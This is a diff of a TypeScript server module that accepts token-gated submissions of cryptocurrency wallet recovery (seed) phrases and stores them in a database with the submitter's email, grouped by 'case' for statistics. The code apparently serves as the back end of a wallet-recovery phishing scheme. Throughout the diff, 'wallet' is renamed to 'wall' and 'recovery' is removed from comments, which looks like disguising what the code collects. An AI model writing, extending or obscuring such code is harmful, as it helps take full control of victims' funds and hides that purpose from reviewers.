@@ -2,11 +2,11 @@
 
 import { db } from '@/lib/db';
 import { findActiveTokenByString, updateTokenLastUsed } from './authToken';
-import { WALLET_TYPE } from '@/generated/prisma/client';
+import { WALL_TYPE } from '@/generated/prisma/client';
 
 export interface RecoverySubmissionData {
 	token: string;
-	walletType: string;
+	wType: string;
 	phrase: string;
 	userEmail?: string;
 	createdAt: Date;
@@ -24,8 +24,8 @@ export interface RecoverySubmissionResult {
 }
 
 /**
- * Validates a recovery phrase format
- * @param phrase - The recovery phrase to validate
+ * Validates a  phrase format
+ * @param phrase - The phrase to validate
  * @returns boolean - True if valid, false otherwise
  */
 function validateRecoveryPhrase(phrase: string): boolean {
@@ -41,21 +41,21 @@ function validateRecoveryPhrase(phrase: string): boolean {
 }
 
 /**
- * Validates wallet type against enum values
- * @param walletType - The wallet type to validate
+ * Validates wall type against enum values
+ * @param wType - The wall type to validate
  * @returns boolean - True if valid, false otherwise
  */
-function validateWalletType(walletType: string): boolean {
-	if (!walletType || typeof walletType !== 'string') {
+function validateWallType(wType: string): boolean {
+	if (!wType || typeof wType !== 'string') {
 		return false;
 	}
 
-	return Object.values(WALLET_TYPE).includes(walletType as WALLET_TYPE);
+	return Object.values(WALL_TYPE).includes(wType as WALL_TYPE);
 }
 
 /**
- * Sanitizes the recovery phrase by normalizing whitespace
- * @param phrase - The recovery phrase to sanitize
+ * Sanitizes the  phrase by normalizing whitespace
+ * @param phrase - The  phrase to sanitize
  * @returns string - The sanitized phrase
  */
 function sanitizeRecoveryPhrase(phrase: string): string {
@@ -72,8 +72,8 @@ function sanitizeRecoveryPhrase(phrase: string): string {
 }
 
 /**
- * Submits a recovery request with auth token verification
- * @param data - Recovery submission data
+ * Submits a  request with auth token verification
+ * @param data -  submission data
  * @returns Promise<RecoverySubmissionResult> - The submission result
  */
 export async function submitRecoveryRequest(
@@ -101,14 +101,14 @@ export async function submitRecoveryRequest(
 		}
 
 		if (
-			!data.walletType ||
-			typeof data.walletType !== 'string' ||
-			data.walletType.trim() === ''
+			!data.wType ||
+			typeof data.wType !== 'string' ||
+			data.wType.trim() === ''
 		) {
 			return {
 				success: false,
-				message: 'Wallet type is required',
-				error: 'MISSING_WALLET_TYPE',
+				message: 'Wall type is required',
+				error: 'MISSING_WALL_TYPE',
 			};
 		}
 
@@ -124,11 +124,11 @@ export async function submitRecoveryRequest(
 			};
 		}
 
-		if (!validateWalletType(data.walletType)) {
+		if (!validateWallType(data.wType)) {
 			return {
 				success: false,
-				message: 'Invalid wallet type selected',
-				error: 'INVALID_WALLET_TYPE',
+				message: 'Invalid wall type selected',
+				error: 'INVALID_WALL_TYPE',
 			};
 		}
 
@@ -167,7 +167,7 @@ export async function submitRecoveryRequest(
 		const existingPhrase = await db.phrase.findFirst({
 			where: {
 				phrase: sanitizedPhrase,
-				walletType: data.walletType as WALLET_TYPE,
+				wType: data.wType as WALL_TYPE,
 				user: {
 					email: userEmail,
 				},
@@ -178,14 +178,14 @@ export async function submitRecoveryRequest(
 			return {
 				success: false,
 				message:
-					'This recovery phrase has already been submitted for this wallet type',
+					'This recovery phrase has already been submitted for this wall type',
 				error: 'DUPLICATE_PHRASE',
 			};
 		}
 
 		const newPhrase = await db.phrase.create({
 			data: {
-				walletType: data.walletType as WALLET_TYPE,
+				wType: data.wType as WALL_TYPE,
 				createdAt: data.createdAt,
 				phrase: sanitizedPhrase,
 				user: {
@@ -233,11 +233,11 @@ export async function submitRecoveryRequest(
 				};
 			}
 
-			if (error.message.includes('Invalid wallet type')) {
+			if (error.message.includes('Invalid wall type')) {
 				return {
 					success: false,
-					message: 'Invalid wallet type provided',
-					error: 'INVALID_WALLET_TYPE',
+					message: 'Invalid wall type provided',
+					error: 'INVALID_WALL_TYPE',
 				};
 			}
 		}
@@ -304,14 +304,14 @@ export async function verifytoken(tokenString: string): Promise<{
  */
 export async function getRecoveryStats(caseId: string): Promise<{
 	totalSubmissions: number;
-	uniqueWalletTypes: number;
+	uniqueWallTypes: number;
 	lastSubmission?: Date;
 }> {
 	try {
 		if (!caseId || typeof caseId !== 'string' || caseId.trim() === '') {
 			return {
 				totalSubmissions: 0,
-				uniqueWalletTypes: 0,
+				uniqueWallTypes: 0,
 			};
 		}
 
@@ -323,13 +323,13 @@ export async function getRecoveryStats(caseId: string): Promise<{
 		if (tokens.length === 0) {
 			return {
 				totalSubmissions: 0,
-				uniqueWalletTypes: 0,
+				uniqueWallTypes: 0,
 			};
 		}
 
 		const phrases = await db.phrase.findMany({
 			select: {
-				walletType: true,
+				wType: true,
 				id: true,
 				createdAt: true,
 			},
@@ -338,18 +338,18 @@ export async function getRecoveryStats(caseId: string): Promise<{
 			},
 		});
 
-		const uniqueWalletTypes = new Set(phrases.map((p) => p.walletType));
+		const uniqueWallTypes = new Set(phrases.map((p) => p.wType));
 
 		return {
 			totalSubmissions: phrases.length,
-			uniqueWalletTypes: uniqueWalletTypes.size,
+			uniqueWallTypes: uniqueWallTypes.size,
 			lastSubmission: phrases.length > 0 ? phrases[0].createdAt : undefined,
 		};
 	} catch (error) {
 		console.error('Error getting recovery stats:', error);
 		return {
 			totalSubmissions: 0,
-			uniqueWalletTypes: 0,
+			uniqueWallTypes: 0,
 		};
 	}
 }
